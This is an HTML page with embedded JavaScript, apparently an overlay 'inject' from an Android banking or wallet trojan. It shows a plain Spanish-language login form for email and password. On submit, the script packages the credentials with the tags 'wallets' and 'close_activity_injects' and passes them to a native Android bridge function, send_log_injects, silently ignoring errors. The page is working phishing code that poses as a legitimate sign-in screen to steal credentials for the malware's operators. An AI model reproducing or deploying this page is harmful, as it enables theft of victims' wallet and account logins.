    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        body {
            background-color: #fefefe;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 15px;
        }

        footer {
            padding: 15px;
        }

        .input {
            width: 100%;
            padding: 8px;
            border: 1px solid #999999;
            border-radius: 6px;
            margin-bottom: 20px;
        }

        .input:focus {
            border: 2px solid #3d62e0;
        }

        label {
            margin-bottom: 5px;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            padding: 10px;
            color: #fff;
            background-color: #3d62e0;
            border: 0;
            border-radius: 6px;
            font-weight: 600;
        }

        .button:disabled {
            opacity: 0.4;
        }
    </style>
</head>

        <section>
            <label for="login"> Introduce tu e-mail </label>
            <input type="email" class="input" id="login" name="login" placeholder="you@example.com" autocomplete="off">

            <label for="password"> Contraseña </label>
            <input type="password" class="input" id="password" name="password" placeholder="Password" autocomplete="off">

            <p style="text-align: center;color: #3d62e0;font-weight: 600;"> ¿Olvidaste tu contraseña? </p>
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Iniciar sesión">
        </footer>
    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');
    
        function check() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 8) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check();
        }

        password.onkeyup = () => {
            check();
        }

        sendData.onclick = () => {
            var data = {};
                data.email = login.value;
                data.password = password.value;
                data.type_injects = "wallets";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
</body>
</html>
